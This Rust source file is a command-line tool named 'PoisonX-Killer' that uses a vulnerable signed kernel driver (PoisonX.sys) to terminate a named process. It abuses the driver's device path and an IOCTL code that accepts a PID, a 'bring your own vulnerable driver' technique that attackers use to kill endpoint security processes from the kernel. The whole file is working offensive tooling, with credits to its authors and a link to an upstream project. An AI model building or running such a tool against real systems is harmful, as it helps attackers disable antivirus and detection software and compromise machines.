use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - PoisonX - j3h4ck
// ============================================================================

// GUID Driver Killer - Process Termination via GUID Device Driver
// IOCTL: 0x22E010
// Input: ASCII string PID
// Discovered by @j3h4ck
// https://github.com/j3h4ck/PoisonKiller/blob/main/PoisonKiller/PoisonKiller.cpp

struct PoisonXDriver;

impl DriverConfig for PoisonXDriver {
    fn driver_name(&self) -> &str {
        "PoisonX"
    }

    fn driver_file(&self) -> &str {
        "PoisonX.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\{F8284233-48F4-4680-ADDD-F8284233}"
    }

    fn ioctl_code(&self) -> u32 {
        0x22E010
    }
    
    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        pid.to_string().into_bytes()
    }

    fn ioctl_output_size(&self) -> usize {
        16
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "PoisonX-Killer", version, author = "j3h4ck,BlackSnufkin,g0h4n")]
#[command(about = "BYOVD process killer using PoisonX driver (Microsoft)")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&PoisonXDriver, &cli.process_name, None)
}
